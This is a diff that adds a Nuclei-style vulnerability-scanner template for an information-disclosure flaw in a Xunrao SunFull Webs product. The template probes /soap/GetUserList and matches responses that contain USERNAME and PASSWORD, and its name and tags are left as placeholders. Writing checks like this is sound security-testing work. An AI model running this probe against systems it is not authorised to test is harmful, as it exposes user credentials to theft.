@@ -1,0 +1,24 @@
+id: SunFull-Webs-GetUserList-weak
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 迅饶科技 GetUserList信息泄露漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/soap/GetUserList"
+      
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - PASSWORD
+      - type: word
+        part: body
+        words:
+          - USERNAME
